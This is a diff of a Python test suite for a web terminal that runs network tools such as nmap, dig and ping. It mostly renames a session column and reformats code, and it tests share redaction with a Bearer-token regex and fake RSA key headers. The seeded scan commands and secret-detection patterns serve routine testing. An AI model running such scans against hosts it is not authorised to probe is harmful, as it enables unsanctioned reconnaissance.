+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, "
                 "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, 0, '[]', 0)",
                 [
                     ("cmp-findings-left", session, "nmap darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:03"),
@@ -24651,7 +25285,7 @@ class TestHistoryRoute:
             )
             conn.executemany(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                 [
                     (
@@ -24707,8 +25341,8 @@ class TestHistoryRoute:
             assert data["objects"]["findings"]["unchanged_count"] == 2
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM findings WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM findings WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -24720,7 +25354,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, "
                 "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 [
                     (
@@ -24760,24 +25394,19 @@ class TestHistoryRoute:
             assert data["hunks"][0]["left_unpaired"] == [0]
             assert data["hunks"][0]["right_unpaired"] == [0]
             assert "sections" not in data
-            left_unpaired = [
-                data["hunks"][0]["left"]["lines"][index]["text"]
-                for index in data["hunks"][0]["left_unpaired"]
-            ]
-            right_unpaired = [
-                data["hunks"][0]["right"]["lines"][index]["text"]
-                for index in data["hunks"][0]["right_unpaired"]
-            ]
+            left_unpaired = [data["hunks"][0]["left"]["lines"][index]["text"] for index in data["hunks"][0]["left_unpaired"]]
+            right_unpaired = [data["hunks"][0]["right"]["lines"][index]["text"] for index in data["hunks"][0]["right_unpaired"]]
             assert left_unpaired == [left_line]
             assert right_unpaired == [right_line]
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
 
 # ── /share ────────────────────────────────────────────────────────────────────
+
 
 class TestShareRoute:
     def test_post_creates_snapshot(self):
@@ -24786,14 +25415,14 @@ class TestShareRoute:
             resp = client.post(
                 "/share",
                 json={"label": "test snapshot", "content": ["line1", "line2"], "apply_redaction": True},
-                headers={"X-Session-ID": anonymous_session_id('test-session')}
+                headers={"X-Session-ID": anonymous_session_id("test-session")},
             )
             assert resp.status_code == 200
             data = json.loads(resp.data)
             assert "id" in data
             assert "url" in data
 
-            delete = client.delete(f"/share/{data['id']}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            delete = client.delete(f"/share/{data['id']}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             assert delete.status_code == 200
 
         audit_rows = _audit_event_rows(target_id=data["id"])
@@ -24810,9 +25439,11 @@ class TestShareRoute:
         client = get_client()
         session_id = anonymous_session_id("share-offload-" + uuid.uuid4().hex[:8])
         content = [{"text": "line " + ("x" * 64), "cls": "notice"}]
-        with tempfile.TemporaryDirectory() as tmp, \
-             mock.patch.object(body_store, "DATA_DIR", tmp), \
-             mock.patch.dict("config.CFG", {"snapshots_inline_max_bytes": 1}):
+        with (
+            tempfile.TemporaryDirectory() as tmp,
+            mock.patch.object(body_store, "DATA_DIR", tmp),
+            mock.patch.dict("config.CFG", {"snapshots_inline_max_bytes": 1}),
+        ):
             create_resp = client.post(
                 "/share",
                 json={"label": "large snapshot", "content": content},
@@ -24850,7 +25481,7 @@ class TestShareRoute:
         conn = sqlite3.connect(DB_PATH)
         try:
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+                "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                 (run_id, session, "theme list"),
             )
             conn.commit()
@@ -24874,15 +25505,14 @@ class TestShareRoute:
         conn = sqlite3.connect(DB_PATH)
         try:
             row = conn.execute(
-                "SELECT entity_type, entity_id, source FROM project_links "
-                "WHERE project_id = ? AND entity_type = 'snapshot'",
+                "SELECT entity_type, entity_id, source FROM project_links WHERE project_id = ? AND entity_type = 'snapshot'",
                 (project["id"],),
             ).fetchone()
         finally:
             conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
-            conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM snapshots WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM projects WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
         assert row is None
@@ -24890,9 +25520,7 @@ class TestShareRoute:
     def test_post_rejects_non_string_label(self):
         client = get_client()
         resp = client.post(
-            "/share",
-            json={"label": 123, "content": []},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            "/share", json={"label": 123, "content": []}, headers={"X-Session-ID": anonymous_session_id("test-session")}
         )
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Label must be a string"
@@ -24902,7 +25530,7 @@ class TestShareRoute:
         resp = client.post(
             "/share",
             json={"label": "bad content", "content": {"text": "line"}},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Content must be a list"
@@ -24912,7 +25540,7 @@ class TestShareRoute:
         resp = client.post(
             "/share",
             json={"label": "bad content", "content": ["ok", 123]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Content items must be strings or objects"
@@ -24922,7 +25550,7 @@ class TestShareRoute:
         resp = client.post(
             "/share",
             json={"label": "bad content", "content": [{"cls": "notice"}]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Content objects must include a string text field"
@@ -24932,7 +25560,7 @@ class TestShareRoute:
         resp = client.post(
             "/share",
             json={"label": "bad content", "content": [{"text": 123, "cls": "notice"}]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Content objects must include a string text field"
@@ -24942,7 +25570,7 @@ class TestShareRoute:
         resp = client.post(
             "/share",
             json={"label": "bad content", "content": [{"text": "hello", "cls": 123}]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Content objects must use string cls values"
@@ -24958,7 +25586,7 @@ class TestShareRoute:
                     {"text": "hi", "cls": "notice"},
                 ],
             },
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 200
         data = json.loads(resp.data)
@@ -24966,12 +25594,15 @@ class TestShareRoute:
 
     def test_post_applies_share_redaction_rules_before_persisting_snapshot(self):
         client = get_client()
-        with mock.patch.dict("config.CFG", {
-            "share_redaction_enabled": True,
-            "share_redaction_rules": [
-                {"pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": ""},
-            ],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "share_redaction_enabled": True,
+                "share_redaction_rules": [
+                    {"pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": ""},
+                ],
+            },
+        ):
             create_resp = client.post(
                 "/share",
                 json={
@@ -24980,7 +25611,7 @@ class TestShareRoute:
                         {"text": "Authorization: Bearer abc123", "cls": "notice"},
                     ],
                 },
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
+                headers={"X-Session-ID": anonymous_session_id("test-session")},
             )
             share_id = json.loads(create_resp.data)["id"]
             fetch = client.get(f"/share/{share_id}?json")
@@ -24989,10 +25620,13 @@ class TestShareRoute:
 
     def test_post_applies_builtin_share_redaction_rules_before_persisting_snapshot(self):
         client = get_client()
-        with mock.patch.dict("config.CFG", {
-            "share_redaction_enabled": True,
-            "share_redaction_rules": [],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "share_redaction_enabled": True,
+                "share_redaction_rules": [],
+            },
+        ):
             create_resp = client.post(
                 "/share",
                 json={
@@ -25004,23 +25638,25 @@ class TestShareRoute:
                         {"text": "-----END RSA PRIVATE KEY-----", "cls": "notice"},
                         {"text": "scan complete", "cls": "notice"},
                         {
-                            "text": json.dumps({
-                                "DetectorName": "PrivateKey",
-                                "Raw": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
-                                "Redacted": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
-                                "SecretParts": {
-                                    "token": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
-                                },
-                                "ExtraData": {
-                                    "duplicate": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
-                                },
-                            }),
+                            "text": json.dumps(
+                                {
+                                    "DetectorName": "PrivateKey",
+                                    "Raw": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
+                                    "Redacted": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
+                                    "SecretParts": {
+                                        "token": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
+                                    },
+                                    "ExtraData": {
+                                        "duplicate": "-----BEGIN RSA PRIVATE KEY-----\nlegacy-key-prefix",
+                                    },
+                                }
+                            ),
                             "cls": "finding",
                         },
                         {"text": "after historical finding", "cls": "notice"},
                     ],
                 },
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
+                headers={"X-Session-ID": anonymous_session_id("test-session")},
             )
             share_id = json.loads(create_resp.data)["id"]
             fetch = client.get(f"/share/{share_id}?json")
@@ -25039,10 +25675,13 @@ class TestShareRoute:
 
     def test_post_skips_share_redaction_when_apply_redaction_false(self):
         client = get_client()
-        with mock.patch.dict("config.CFG", {
-            "share_redaction_enabled": True,
-            "share_redaction_rules": [],
-        }):
+        with mock.patch.dict(
+            "config.CFG",
+            {
+                "share_redaction_enabled": True,
+                "share_redaction_rules": [],
+            },
+        ):
             create_resp = client.post(
                 "/share",
                 json={
@@ -25052,7 +25691,7 @@ class TestShareRoute:
                         {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                     ],
                 },
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
+                headers={"X-Session-ID": anonymous_session_id("test-session")},
             )
             share_id = json.loads(create_resp.data)["id"]
             fetch = client.get(f"/share/{share_id}?json")
@@ -25068,7 +25707,7 @@ class TestShareRoute:
                 "apply_redaction": "yes",
                 "content": [{"text": "line 1", "cls": ""}],
             },
-            headers={"X-Session-ID": anonymous_session_id('test-session')},
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         assert resp.status_code == 400
         data = json.loads(resp.data)
@@ -25076,11 +25715,7 @@ class TestShareRoute:
 
     def test_post_rejects_non_object_json(self):
         client = get_client()
-        resp = client.post(
-            "/share",
-            json=["bad", "payload"],
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
-        )
+        resp = client.post("/share", json=["bad", "payload"], headers={"X-Session-ID": anonymous_session_id("test-session")})
         assert resp.status_code == 400
         assert json.loads(resp.data)["error"] == "Request body must be a JSON object"
 
@@ -25099,25 +25734,25 @@ class TestShareRoute:
         create_resp = client.post(
             "/share",
             json={"label": "delete-me", "content": ["line"]},
-            headers={"X-Session-ID": anonymous_session_id('delete-share-session')},
+            headers={"X-Session-ID": anonymous_session_id("delete-share-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         label_resp = client.post(
             f"/entities/snapshot/{share_id}/labels",
             json={"label": "handoff"},
-            headers={"X-Session-ID": anonymous_session_id('delete-share-session')},
+            headers={"X-Session-ID": anonymous_session_id("delete-share-session")},
         )
         note_resp = client.put(
             f"/entities/snapshot/{share_id}/note",
             json={"body": "Snapshot context"},
-            headers={"X-Session-ID": anonymous_session_id('delete-share-session')},
+            headers={"X-Session-ID": anonymous_session_id("delete-share-session")},
         )
         assert label_resp.status_code == 201
         assert note_resp.status_code == 200
 
         resp = client.delete(
             f"/share/{share_id}",
-            headers={"X-Session-ID": anonymous_session_id('delete-share-session')},
+            headers={"X-Session-ID": anonymous_session_id("delete-share-session")},
         )
 
         assert resp.status_code == 200
@@ -25234,7 +25869,7 @@ class TestShareRoute:
         create_resp = client.post(
             "/share",
             json={"label": "my label", "content": ["hello", "world"]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
 
@@ -25250,7 +25885,7 @@ class TestShareRoute:
         create_resp = client.post(
             "/share",
             json={"label": "html test", "content": ["line"]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         resp = client.get(f"/share/{share_id}")
@@ -25262,7 +25897,7 @@ class TestShareRoute:
         create_resp = client.post(
             "/share",
             json={"label": "theme selector test", "content": ["line"]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         client.set_cookie("pref_theme_name", "apricot_sand")
@@ -25286,27 +25921,24 @@ class TestShareRoute:
         )
         assert 'class="permalink-page"' in body
         assert 'data-theme="apricot_sand"' in body
-        assert '/static/css/core/base.css?v=' in body
-        assert '/static/css/features/history.css?v=' in body
-        assert '/static/css/terminal_export.css?v=' in body
+        assert "/static/css/core/base.css?v=" in body
+        assert "/static/css/features/history.css?v=" in body
+        assert "/static/css/terminal_export.css?v=" in body
         assert 'type="module" src="/static/js/permalink.entry.js"' in body
-        assert '/static/js/permalink.entry.js?v=' not in body
+        assert "/static/js/permalink.entry.js?v=" not in body
         assert "__darklabBootstrapAsset" in body
         assert "ESM_BOOTSTRAP_LOAD_FAILED" in body
         assert "window.__darklabBootstrapAsset.start('permalink', 'permalink'," in body
-        assert (
-            "window.__darklabBootstrapAsset.failed('permalink', 'permalink', this.src, event)"
-            in body
-        )
-        assert '/static/js/core/utils.js?v=' not in body
-        assert '/static/js/permalink.js?v=' not in body
+        assert "window.__darklabBootstrapAsset.failed('permalink', 'permalink', this.src, event)" in body
+        assert "/static/js/core/utils.js?v=" not in body
+        assert "/static/js/permalink.js?v=" not in body
 
     def test_get_share_html_bundle_mode_renders_per_page_asset_bundles(self):
         client = get_client()
         create_resp = client.post(
             "/share",
             json={"label": "bundle mode test", "content": ["line"]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         with mock.patch.dict("config.CFG", {"asset_bundle_mode": "bundle"}):
@@ -25315,22 +25947,19 @@ class TestShareRoute:
         assert re.search(r'href="/static/build/terminal-export\.[a-f0-9]{12}\.css"', body)
         assert re.search(r'type="module" src="/static/build/permalink\.[a-f0-9]{12}\.js"', body)
         assert "window.__darklabBootstrapAsset.start('permalink', 'permalink'," in body
-        assert (
-            "window.__darklabBootstrapAsset.failed('permalink', 'permalink', this.src, event)"
-            in body
-        )
-        assert '/static/css/core/base.css?v=' not in body
-        assert '/static/css/features/history.css?v=' not in body
-        assert '/static/css/terminal_export.css?v=' not in body
-        assert '/static/js/core/utils.js?v=' not in body
-        assert '/static/js/permalink.js?v=' not in body
+        assert "window.__darklabBootstrapAsset.failed('permalink', 'permalink', this.src, event)" in body
+        assert "/static/css/core/base.css?v=" not in body
+        assert "/static/css/features/history.css?v=" not in body
+        assert "/static/css/terminal_export.css?v=" not in body
+        assert "/static/js/core/utils.js?v=" not in body
+        assert "/static/js/permalink.js?v=" not in body
 
     def test_get_share_html_contains_label(self):
         client = get_client()
         create_resp = client.post(
             "/share",
             json={"label": "unique-label-xyz", "content": []},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         resp = client.get(f"/share/{share_id}")
@@ -25348,7 +25977,7 @@ class TestShareRoute:
                     {"text": "[process exited with code 0 in 0.1s]", "cls": "exit-ok"},
                 ],
             },
-            headers={"X-Session-ID": anonymous_session_id('test-session')},
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
 
@@ -25370,7 +25999,7 @@ class TestShareRoute:
                     {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                 ],
             },
-            headers={"X-Session-ID": anonymous_session_id('test-session')},
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
 
@@ -25386,9 +26015,7 @@ class TestShareRoute:
     def test_get_share_html_content_type(self):
         client = get_client()
         create_resp = client.post(
-            "/share",
-            json={"label": "ct-test", "content": []},
-            headers={"X-Session-ID": anonymous_session_id('test-session')}
+            "/share", json={"label": "ct-test", "content": []}, headers={"X-Session-ID": anonymous_session_id("test-session")}
         )
         share_id = json.loads(create_resp.data)["id"]
         resp = client.get(f"/share/{share_id}")
@@ -25404,22 +26031,23 @@ class TestShareRoute:
                     {"text": "line 1", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
                 ],
             },
-            headers={"X-Session-ID": anonymous_session_id('test-session')},
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         resp = client.get(f"/share/{share_id}")
         body = resp.get_data(as_text=True)
         assert 'id="toggle-ln"' in body
         assert 'id="toggle-ts"' in body
-        assert 'timestamps unavailable' not in body
+        assert "timestamps unavailable" not in body
 
     def test_get_share_html_shows_line_count_meta(self):
         from config import APP_VERSION
+
         client = get_client()
         create_resp = client.post(
             "/share",
             json={"label": "meta-lines-test", "content": ["a", "b", "c"]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')},
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         body = client.get(f"/share/{share_id}").get_data(as_text=True)
@@ -25432,7 +26060,7 @@ class TestShareRoute:
         create_resp = client.post(
             "/share",
             json={"label": "no-exit-test", "content": ["output line"]},
-            headers={"X-Session-ID": anonymous_session_id('test-session')},
+            headers={"X-Session-ID": anonymous_session_id("test-session")},
         )
         share_id = json.loads(create_resp.data)["id"]
         body = client.get(f"/share/{share_id}").get_data(as_text=True)
@@ -25440,6 +26068,7 @@ class TestShareRoute:
 
 
 # ── /welcome ──────────────────────────────────────────────────────────────────
+
 
 class TestWelcomeRoute:
     def test_returns_200(self):
@@ -25470,6 +26099,7 @@ class TestWelcomeRoute:
 
 # ── /autocomplete ─────────────────────────────────────────────────────────────
 
+
 class TestAutocompleteRoute:
     def test_returns_200(self):
         client = get_client()
@@ -25490,23 +26120,29 @@ class TestAutocompleteRoute:
 
     def test_returns_configured_context(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_autocomplete_context_from_commands_registry", return_value={
-            "nmap": {"flags": []},
-        }):
+        with mock.patch(
+            "blueprints.content.load_autocomplete_context_from_commands_registry",
+            return_value={
+                "nmap": {"flags": []},
+            },
+        ):
             data = json.loads(client.get("/autocomplete").data)
         assert data["suggestions"] == []
         assert "nmap" in data["context"]
 
     def test_returns_wordlist_autocomplete_catalog(self):
         client = get_client()
-        with mock.patch("blueprints.content.wordlist_autocomplete_items", return_value=[
-            {
-                "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
-                "label": "Discovery/DNS/subdomains-top1million-5000.txt",
-                "description": "DNS wordlist",
-                "wordlist_category": "dns",
-            },
-        ]):
+        with mock.patch(
+            "blueprints.content.wordlist_autocomplete_items",
+            return_value=[
+                {
+                    "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+                    "label": "Discovery/DNS/subdomains-top1million-5000.txt",
+                    "description": "DNS wordlist",
+                    "wordlist_category": "dns",
+                },
+            ],
+        ):
             data = json.loads(client.get("/autocomplete").data)
 
         assert data["wordlists"][0]["wordlist_category"] == "dns"
@@ -25515,12 +26151,13 @@ class TestAutocompleteRoute:
 
 # ── /history session isolation ────────────────────────────────────────────────
 
+
 class TestHistorySessionIsolation:
     def test_empty_history_for_fresh_session(self):
         client = get_client()
-        data = json.loads(client.get(
-            "/history", headers={"X-Session-ID": anonymous_session_id('fresh-session-no-runs-xyz')}
-        ).data)
+        data = json.loads(
+            client.get("/history", headers={"X-Session-ID": anonymous_session_id("fresh-session-no-runs-xyz")}).data
+        )
         assert data["runs"] == []
 
     def test_history_scoped_to_session(self):
@@ -25529,20 +26166,15 @@ class TestHistorySessionIsolation:
         run_id = "isolation-test-run-id-001"
         conn = sqlite3.connect(DB_PATH)
         conn.execute(
-            "INSERT INTO runs (id, session_id, command, started) "
-            "VALUES (?, ?, ?, datetime('now'))",
-            (run_id, session_a, "ping isolation-test")
+            "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+            (run_id, session_a, "ping isolation-test"),
         )
         conn.commit()
         conn.close()
         try:
             client = get_client()
-            runs_a = json.loads(client.get(
-                "/history", headers={"X-Session-ID": session_a}
-            ).data)["runs"]
-            runs_b = json.loads(client.get(
-                "/history", headers={"X-Session-ID": session_b}
-            ).data)["runs"]
+            runs_a = json.loads(client.get("/history", headers={"X-Session-ID": session_a}).data)["runs"]
+            runs_b = json.loads(client.get("/history", headers={"X-Session-ID": session_b}).data)["runs"]
             assert any(r["id"] == run_id for r in runs_a)
             assert not any(r["id"] == run_id for r in runs_b)
         finally:
@@ -25558,12 +26190,12 @@ class TestHistorySessionIsolation:
         run_b = "delete-test-run-B"
         conn = sqlite3.connect(DB_PATH)
         conn.execute(
-            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
-            (run_a, session_a, "ping a")
+            "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+            (run_a, session_a, "ping a"),
         )
         conn.execute(
-            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
-            (run_b, session_b, "ping b")
+            "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, ?, datetime('now'))",
+            (run_b, session_b, "ping b"),
         )
         conn.commit()
         conn.close()
@@ -25572,9 +26204,7 @@ class TestHistorySessionIsolation:
             client.delete("/history", headers={"X-Session-ID": session_a})
             # Session B's run should be unaffected
             conn = sqlite3.connect(DB_PATH)
-            count = conn.execute(
-                "SELECT COUNT(*) FROM runs WHERE id=?", (run_b,)
-            ).fetchone()[0]
+            count = conn.execute("SELECT COUNT(*) FROM runs WHERE id=?", (run_b,)).fetchone()[0]
             conn.close()
             assert count == 1
         finally:
@@ -25585,6 +26215,7 @@ class TestHistorySessionIsolation:
 
 
 # ── /history/<run_id> permalink ───────────────────────────────────────────────
+
 
 class TestRunPermalinkRoute:
     def _insert_run(
@@ -25604,7 +26235,7 @@ class TestRunPermalinkRoute:
         session_id = session_id or anonymous_session_id("test-session")
         conn = sqlite3.connect(DB_PATH)
         conn.execute(
-            "INSERT INTO runs (id, session_id, team_id, command, started, output_preview, preview_truncated, "
+            "INSERT INTO runs (id, personal_workspace_id, team_id, command, started, output_preview, preview_truncated, "
             "output_line_count, full_output_available, full_output_truncated) "
             "VALUES (?, ?, ?, ?, datetime('now'), ?, ?, ?, ?, ?)",
             (
@@ -25617,7 +26248,7 @@ class TestRunPermalinkRoute:
                 len(output or []),
                 full_output_available,
                 full_output_truncated,
-            )
+            ),
         )
         if full_output_available and full_output_lines is not None:
             conn.execute(
@@ -25634,7 +26265,7 @@ class TestRunPermalinkRoute:
         for artifact in artifacts or []:
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))",
                 (
                     artifact["id"],
@@ -25652,6 +26283,7 @@ class TestRunPermalinkRoute:
         if full_output_available and full_output_lines is not None:
             import gzip
             from services.runs.output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
+
             ensure_run_output_dir()
             with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                 for line in full_output_lines:
@@ -25659,6 +26291,7 @@ class TestRunPermalinkRoute:
 
     def _delete_run(self, run_id):
         from services.runs.output_store import RUN_OUTPUT_DIR
+
         conn = sqlite3.connect(DB_PATH)
         conn.execute("DELETE FROM findings WHERE run_id=?", (run_id,))
         conn.execute("DELETE FROM entity_labels WHERE entity_id=?", (run_id,))
@@ -25677,7 +26310,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-html-test-run"
         self._insert_run(run_id, "ping google.com", ["64 bytes"])
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             assert resp.status_code == 200
             assert b"<html" in resp.data.lower()
         finally:
@@ -25688,14 +26321,16 @@ class TestRunPermalinkRoute:
         self._insert_run(
             run_id,
             "nmap -sV 10.0.0.1",
-            artifacts=[{
-                "id": "permalink-html-artifact",
-                "workspace_path": "reports/nmap.txt",
-                "display_name": "nmap.txt",
-                "kind": "output",
-                "byte_size": 64,
-                "detected_by": "workspace_flag",
-            }],
+            artifacts=[
+                {
+                    "id": "permalink-html-artifact",
+                    "workspace_path": "reports/nmap.txt",
+                    "display_name": "nmap.txt",
+                    "kind": "output",
+                    "byte_size": 64,
+                    "detected_by": "workspace_flag",
+                }
+            ],
         )
         with db_connect() as conn:
             materialize_run_entities(
@@ -25707,7 +26342,7 @@ class TestRunPermalinkRoute:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'open service', 'open service', 0, ?, datetime('now'))",
                 (
                     "permalink-html-atlas-finding",
@@ -25718,7 +26353,7 @@ class TestRunPermalinkRoute:
             )
             conn.commit()
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             assert b"nmap -sV 10.0.0.1" in resp.data
             assert b"1 artifact" in resp.data
             assert b"1 Atlas entity" in resp.data
@@ -25732,19 +26367,21 @@ class TestRunPermalinkRoute:
             run_id,
             "dig google.com",
             ["answer section"],
-            artifacts=[{
-                "id": "permalink-json-artifact",
-                "workspace_path": "reports/dig.txt",
-                "display_name": "dig.txt",
-                "kind": "output",
-                "byte_size": 128,
-                "detected_by": "workspace_flag",
-            }],
+            artifacts=[
+                {
+                    "id": "permalink-json-artifact",
+                    "workspace_path": "reports/dig.txt",
+                    "display_name": "dig.txt",
+                    "kind": "output",
+                    "byte_size": 128,
+                    "detected_by": "workspace_flag",
+                }
+            ],
         )
         conn = sqlite3.connect(DB_PATH)
         conn.execute(
             "INSERT INTO findings "
-            "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+            "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
             "VALUES (?, ?, ?, 'finding', 'answer found', 'answer section', 0, ?, datetime('now'))",
             (
                 "permalink-json-finding",
@@ -25755,13 +26392,13 @@ class TestRunPermalinkRoute:
         )
         conn.execute(
             "INSERT INTO entity_labels "
-            "(id, session_id, entity_type, entity_id, label, created) "
+            "(id, personal_workspace_id, entity_type, entity_id, label, created) "
             "VALUES (?, ?, 'run', ?, 'baseline', datetime('now'))",
             ("permalink-json-label", anonymous_session_id("test-session"), run_id),
         )
         conn.execute(
             "INSERT INTO entity_notes "
-            "(id, session_id, entity_type, entity_id, body, created, updated) "
+            "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
             "VALUES (?, ?, 'run', ?, 'review note', datetime('now'), datetime('now'))",
             ("permalink-json-note", anonymous_session_id("test-session"), run_id),
         )
@@ -25769,10 +26406,12 @@ class TestRunPermalinkRoute:
         conn.close()
         try:
             data = json.loads(
-                get_client().get(
+                get_client()
+                .get(
                     f"/history/{run_id}?json",
-                    headers={"X-Session-ID": anonymous_session_id('test-session')},
-                ).data
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .data
             )
             assert data["command"] == "dig google.com"
             assert "answer section" in data["output"]
@@ -25789,10 +26428,12 @@ class TestRunPermalinkRoute:
         self._insert_run(run_id, "dig google.com", ["answer section"])
         try:
             data = json.loads(
-                get_client().get(
+                get_client()
+                .get(
                     f"/history/{run_id}?json",
